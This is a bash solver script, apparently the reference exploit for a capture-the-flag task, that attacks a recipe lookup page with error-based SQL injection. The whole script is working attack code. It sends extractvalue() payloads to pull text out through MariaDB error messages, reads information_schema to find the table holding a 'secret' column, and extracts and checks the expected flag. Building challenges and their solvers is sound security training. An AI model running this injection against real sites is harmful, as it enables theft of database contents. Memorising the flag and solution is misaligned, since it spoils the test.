#!/usr/bin/env bash
# solvers/p1_2.sh, Task 1.2 "Netero's Recipe Vault" canonical exploit.
#
# The recipe lookup route builds its query with raw string concatenation:
#   SELECT name FROM vault WHERE id='{id}'
# and, critically, surfaces the raw DBMS exception text back to the page
# on a query error. MariaDB's extractvalue() throws an XPATH syntax error
# whose message embeds (up to ~32 chars of) its second argument, so any
# subquery wrapped in extractvalue(1, concat(0x7e, (subquery))) gets its
# result smuggled into that error string, error-based extraction without
# ever seeing a normal result row.
#
# This script never hardcodes the target table/column names. It discovers
# them live, the same way a real attacker without source access would:
#   1. confirm the oracle leaks arbitrary attacker-chosen text at all
#   2. read information_schema to find which table has both a `name`
#      column (the one the app's own visible query selects) and a
#      `secret` column (the field CHALLENGER.md's briefing names as the
#      objective), the combination that uniquely identifies the real
#      target in this seed's shared schema
#   3. only then extract that table's secret
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{100_type_error_leak}"

# leak <sql-expression>: wraps a scalar SQL expression in the
# extractvalue() oracle, sends it as the `id` param, and prints back
# whatever text MariaDB echoed inside the resulting XPATH syntax error.
leak() {
    local expr="$1"
    local payload="1' AND extractvalue(1,concat(0x7e,(${expr})))-- -"
    local resp
    resp=$(curl -s -G "${BASE}/p1/recipe" --data-urlencode "id=${payload}")
    echo "$resp" | grep -oP "XPATH syntax error: &#39;~\K[^&]*(?=&#39;)"
}

echo "[p1_2] step 1: confirm the oracle leaks arbitrary attacker-chosen text"
canary=$(leak "'solver-canary-1234'")
echo "  id=1' AND extractvalue(1,concat(0x7e,'solver-canary-1234'))-- - -> leaked: '${canary}'"
if [[ "$canary" != "solver-canary-1234" ]]; then
    echo "[p1_2] FAIL: oracle did not echo back the canary string, sink may be broken"
    exit 1
fi
echo "  ok: the error message is a genuine read-arbitrary-text channel"

echo "[p1_2] step 2: find the table with both a 'name' and a 'secret' column"
echo "  (the app's own query selects 'name'; the briefing names 'secret' as"
echo "  the objective field, this schema is shared across every phase, so"
echo "  column_name='secret' alone matches more than one table)"
table=$(leak "SELECT c1.table_name FROM information_schema.columns c1
    WHERE c1.table_schema=database() AND c1.column_name='secret'
    AND EXISTS (SELECT 1 FROM information_schema.columns c2
                WHERE c2.table_schema=c1.table_schema
                AND c2.table_name=c1.table_name
                AND c2.column_name='name')
    LIMIT 1")
echo "  discovered table: '${table}'"
if [[ -z "$table" ]]; then
    echo "[p1_2] FAIL: could not discover a table with both name+secret columns"
    exit 1
fi

echo "[p1_2] step 3: extract the secret from the discovered table"
secret=$(leak "SELECT secret FROM ${table} LIMIT 1")
echo "  SELECT secret FROM ${table} LIMIT 1 -> '${secret}'"

if [[ "$secret" == "$FLAG" ]]; then
    echo "  ok: response contains flag: ${secret}"
    echo "[p1_2] PASS"
    exit 0
else
    echo "  FAIL: recovered value does not match the expected flag"
    echo "  expected: ${FLAG}"
    echo "  got:      ${secret}"
    echo "[p1_2] FAIL"
    exit 1
fi
